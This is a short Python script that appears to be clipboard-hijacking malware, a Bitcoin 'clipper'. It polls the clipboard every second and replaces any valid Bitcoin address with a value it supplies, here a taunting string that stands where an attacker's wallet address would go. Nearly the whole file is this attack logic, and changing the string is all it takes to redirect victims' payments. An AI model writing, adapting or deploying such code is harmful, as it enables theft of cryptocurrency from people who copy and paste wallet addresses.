import asyncio

from helpers.bitcoin import bitcoin
from helpers.clipboard import clipboard
    
async def bitcoinClipper(switch_address: str):
    while True:
        await asyncio.sleep(1)
        clipboard_contents: str = clipboard.contents()
        
        if bitcoin.is_valid_address(clipboard_contents) is True:
            
            clipboard.set_contents(switch_address)

if __name__ == "__main__":
    switch_address: str = "You just got bitcoin clippered."

    asyncio.run(bitcoinClipper(switch_address=switch_address))#
